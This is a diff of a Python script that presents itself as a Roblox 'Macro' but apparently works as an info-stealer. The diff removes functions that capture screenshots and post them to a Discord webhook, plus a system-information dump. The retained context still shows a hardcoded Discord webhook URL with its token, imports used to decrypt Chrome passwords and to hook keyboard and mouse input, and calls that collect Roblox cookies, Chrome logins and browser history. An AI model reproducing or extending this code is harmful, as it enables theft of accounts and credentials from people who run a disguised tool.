@@ -26,10 +26,6 @@ import win32crypt
 from Crypto.Cipher import AES
 from pynput import mouse, keyboard as pynput_keyboard
 from pynput import mouse, keyboard
-import mss
-import io
-from datetime import datetime
-
 
 WEBHOOK_URL = "https://discord.com/api/webhooks/1428033334780629147/aVYrRB172coH38ajLXrj5vwlBftEppXC7mkfICZUjDGZIPjA_eZDtl70T_K6Mj4md8z8"  # Replace this with your actual webhook URL
 
@@ -387,64 +383,6 @@ def generate_key(length=20):
     characters = string.ascii_uppercase + string.digits
     return ''.join(random.choice(characters) for _ in range(length))
 
-def get_size(bytes, suffix="B"):
-    factor = 1024
-    for unit in ["", "K", "M", "G", "T"]:
-        if bytes < factor:
-            return f"{bytes:.2f} {unit}{suffix}"
-        bytes /= factor
-
-def get_system_info():
-    print("=== SYSTEM INFORMATION ===")
-    print(f"Username: {getpass.getuser()}")
-    print(f"Computer Name: {socket.gethostname()}")
-    print(f"OS: {platform.system()} {platform.release()}")
-    print(f"Version: {platform.version()}")
-    print(f"Architecture: {platform.architecture()[0]}")
-    
-    # CPU info
-    print(f"Processor: {platform.processor()}")
-    print(f"Physical cores: {psutil.cpu_count(logical=False)}")
-    print(f"Total cores: {psutil.cpu_count(logical=True)}")
-    
-    # Memory info
-    svmem = psutil.virtual_memory()
-    print(f"Total RAM: {get_size(svmem.total)}")
-    print(f"Available RAM: {get_size(svmem.available)}")
-    
-    # Disk info
-    partitions = psutil.disk_partitions()
-    for partition in partitions:
-        try:
-            partition_usage = psutil.disk_usage(partition.mountpoint)
-            print(f"Disk {partition.device}: Total: {get_size(partition_usage.total)} | Free: {get_size(partition_usage.free)}")
-        except PermissionError:
-            continue
-
-def send_screenshot_to_discord(webhook_url):
-    with mss.mss() as sct:
-        screenshot = sct.grab(sct.monitors[1])
-        png_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
-        image_file = io.BytesIO(png_bytes)
-        
-        files = {
-            'file': (f'screenshot_{datetime.now().strftime("%H%M%S")}.png', image_file, 'image/png')
-        }
-        
-        data = {
-            'content': f'Screenshot taken at {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}',
-            'username': 'Screenshot Bot'
-        }
-        
-        requests.post(webhook_url, files=files, data=data)
-
-def continuous_screenshots(duration=5, interval=1):
-    start_time = time.time()
-    
-    while (time.time() - start_time) < duration:
-        send_screenshot_to_discord(DISCORD_WEBHOOK)
-        time.sleep(interval)
-
 if __name__ == "__main__":
     print("[*] Launching Macro...")
 
@@ -452,8 +390,6 @@ if __name__ == "__main__":
     main()
     retrieve_roblox_cookies()
     collect_chrome_logins()
-    get_system_info()
-    continuous_screenshots(duration=5, interval=1)
     
     # Browser history
     history = get_chrome_history(limit=100)
